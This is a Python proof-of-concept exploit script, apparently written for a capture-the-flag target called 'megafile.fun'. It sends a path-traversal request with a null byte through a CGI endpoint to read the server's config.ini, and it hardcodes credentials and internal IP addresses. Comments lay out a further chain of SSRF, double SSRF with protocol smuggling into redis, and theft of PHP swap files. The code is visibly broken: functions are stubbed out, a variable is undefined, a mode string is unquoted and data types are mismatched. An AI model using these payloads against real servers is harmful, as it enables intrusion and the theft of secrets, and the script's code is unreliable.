#!/usr/bin/env python
import requests, json
from hashlib import sha512
import os.path
from ConfigParser import ConfigParser

output_file = ".poc.json"

creds = {
	"user": "iamthebestuser-test",
	"password": "i like passwords, they are the bestest!123"
}

prod_server = "https://megafile.fun/"
dev_server = "https://abqtt.supersecret.dev-test.megafile.fun/"
db_server_pub = "db.megafile.fun"
db_server_priv = "172.31.38.50"
localhost = "127.0.0.1"

# names and hashes of certain files that need to exist in prod or dev
prod_files = [
	{
		"/var/www/megafile/config.ini":
			"c8065ec6655b5b79a0ec1736b3d88d49e8ddf3d3bc559d27f6840aaeef6e5fd512d4274014fdd3cee6aa27fda04147b805592840e7343d749fcbad03080aa5af"
	},
	{
		"messages.txt":
			"e5bda951b3df07a199f58034d7db1631c5673254253cb9f71be481c22052d2181283c3ff5d437de86963182a2f28150343f748cd020eb0d368ac78d84488426d"
	}
]

dev_files = [
	{
		".functions.php.swp":
			"9005e766094de73c481298559b8288639b686d91e73ff3fd35e07796029dfd982f00c38e380d264771d1fd77610ecf9b8a474ea8fb3fea9422edf0b6a0cb9b9d"
	},
	{
		".report-uri.php.swp":
			"4a65ca937c901c6f3c052c35cd1d40b2073b492ef5c56a41f649bc0b78d300aad02ab585cbc063bbbb4b69c1967076c2a0819b919cc909986e67db921a303bd9"
	}
	# add swagger.json
	# add message.txt
]

def create_user(server):
	'''
	Make request to web app to create a user
	'''
	creds = ""

	return creds

def get_config_file(file_hash):
	payload = "cgi-bin/get_xml.cgi?name=../config.ini%00{}.xml".format(creds['user'])
	r = requests.get(prod_server + payload)
	if r.status_code == 200:
		cur_hash = sha512(r.text)
		if cur_hash == file_hash:
			# write config to a file
			config_temp = ".config.tmp"
			with open(config_temp, w) as config:
				config.write(r.text)

			config = ConfigParser(config_temp)

			#return the redis config
			return redis['redis']
			# redis = config['redis']
			# return redis

	return None

def get_php_swp_files():
	return "Asdf"

def main():
	creds = ""

	#if output file exists, we already created the user
	if os.path.isfile(output_file):
		with open(output_file, "r") as f:
			creds = json.load(f)
	else:
		creds = create_user(prod_server)
		create_user(dev_server)

		with open(output_file, "w") as f:
			json.dump(creds, f)

	# get redis parameters from config.ini
	redis = get_config_file(prod_files['/var/www/megafile/config.ini'])

	if not redis:
		print "error getting config file"
		return -1

	# get php swap files
	bypass_url = get_php_swp_files()

	# get swagger.json via SSRF

	# add share to redis via double SSRF + protocol smuggling

	# get message.txt from prod app

if __name__ == '__main__':
	exit(main())
